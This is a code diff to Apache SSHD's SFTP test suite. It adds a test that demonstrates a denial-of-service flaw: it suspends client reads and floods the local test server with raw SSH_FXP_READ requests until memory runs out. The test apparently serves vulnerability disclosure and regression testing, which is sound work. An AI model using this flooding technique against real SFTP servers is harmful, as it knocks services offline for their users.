@@ -68,6 +68,7 @@ import org.apache.sshd.common.channel.WindowClosedException;
 import org.apache.sshd.common.channel.exception.SshChannelClosedException;
 import org.apache.sshd.common.file.FileSystemFactory;
 import org.apache.sshd.common.file.virtualfs.VirtualFileSystemFactory;
+import org.apache.sshd.common.io.nio2.Nio2Session;
 import org.apache.sshd.common.random.Random;
 import org.apache.sshd.common.session.SessionContext;
 import org.apache.sshd.common.util.GenericUtils;
@@ -77,6 +78,7 @@ import org.apache.sshd.common.util.buffer.Buffer;
 import org.apache.sshd.common.util.buffer.BufferUtils;
 import org.apache.sshd.common.util.buffer.ByteArrayBuffer;
 import org.apache.sshd.common.util.io.IoUtils;
+import org.apache.sshd.mina.MinaSession;
 import org.apache.sshd.server.session.ServerSession;
 import org.apache.sshd.server.subsystem.SubsystemFactory;
 import org.apache.sshd.sftp.SftpModuleProperties;
@@ -140,11 +142,12 @@ public class SftpTest extends AbstractSftpClientTestSupport {
         if (forced != null) {
             outputDebugMessage("Removed forced version=%s", forced);
         }
-
+/*
         JSch sch = new JSch();
         session = sch.getSession("sshd", TEST_LOCALHOST, port);
         session.setUserInfo(new SimpleUserInfo("sshd"));
         session.connect();
+        */
     }
 
     @After
@@ -197,6 +200,67 @@ public class SftpTest extends AbstractSftpClientTestSupport {
         assertArrayEquals("Mismatched text part", expectedText, actualText);
     }
 
+    /**
+     * Demonstrates an DoS vulnerability by opening a file and requesting data from it without actually reading
+     * any response data, the buffers in {@link org.apache.sshd.common.channel.BufferedIoOutputStream} fill up until
+     * an Out Of Memory Error occurs.
+     * To test, the available heap memory of the server must be below the value set in requested_data_volume
+     * limit the available heap memory of the junit exection by passing "-Xmx256m" to the VM.
+     */
+    @Test
+    public void testReadRequestsOutOfMemory() throws Exception {
+        Path targetPath = detectTargetFolder();
+        Path parentPath = targetPath.getParent();
+        Path lclSftp = CommonTestSupportUtils.resolve(
+                targetPath, SftpConstants.SFTP_SUBSYSTEM_NAME, getClass().getSimpleName(), getCurrentTestName());
+
+        // Generate some random data file
+        Path testFile = assertHierarchyTargetFolderExists(lclSftp).resolve("file.txt");
+        byte[] expected = new byte[1024];
+        Factory<? extends Random> factory = sshd.getRandomFactory();
+        Random rnd = factory.create();
+        rnd.fill(expected);
+        Files.write(testFile, expected);
+
+        String file = CommonTestSupportUtils.resolveRelativeRemotePath(parentPath, testFile);
+        try (SftpClient sftp = createSingleSessionClient();
+             CloseableHandle handle = sftp.open(file, OpenMode.Read)) {
+            // Prevent the client from reading any packets from the server to provoke serverside buffers to fill up
+            if (sftp.getSession().getIoSession() instanceof MinaSession) {
+                ((MinaSession) sftp.getSession().getIoSession()).getSession().suspendRead();
+            } else {
+                ((Nio2Session) sftp.getSession().getIoSession()).suspendRead();
+            }
+
+            // Always read from the same offset. Thereby one can work with a small file.
+            final long curPos = 0;
+            byte[] buffer = new byte[32768];
+            final long read_length = buffer.length;
+            // Request about 1 GB of data
+            final int requested_data_volume = 1024*1024*1204;
+            for (int i = 0; i < (requested_data_volume / read_length); i++) {
+                if (i % 500 == 0) {
+                    System.out.println("Number of sent read requests: " + i );
+                }
+                // Send a SSH_FXP_READ command to the server without reading the response
+                byte[] id = Objects.requireNonNull(handle, "No handle").getIdentifier();
+                Buffer requestBuffer = new ByteArrayBuffer(id.length + Long.SIZE, false);
+                requestBuffer.putBytes(id);
+                requestBuffer.putLong(curPos);
+                requestBuffer.putInt(read_length);
+                ((RawSftpClient)sftp).send(SftpConstants.SSH_FXP_READ, requestBuffer);
+
+                Thread.sleep(1);
+            }
+            Thread.sleep(1000);
+        }
+    }
+
+    /**
+     *
+     * @throws Exception
+     */
+
     @Test // see SSHD-545
     public void testReadBufferLimit() throws Exception {
         Path targetPath = detectTargetFolder();
@@ -226,8 +290,8 @@ public class SftpTest extends AbstractSftpClientTestSupport {
                 byte actByte = actual[index];
                 if (expByte != actByte) {
                     fail("Mismatched values at index=" + index
-                         + ": expected=0x" + Integer.toHexString(expByte & 0xFF)
-                         + ", actual=0x" + Integer.toHexString(actByte & 0xFF));
+                            + ": expected=0x" + Integer.toHexString(expByte & 0xFF)
+                            + ", actual=0x" + Integer.toHexString(actByte & 0xFF));
                 }
             }
         } finally {
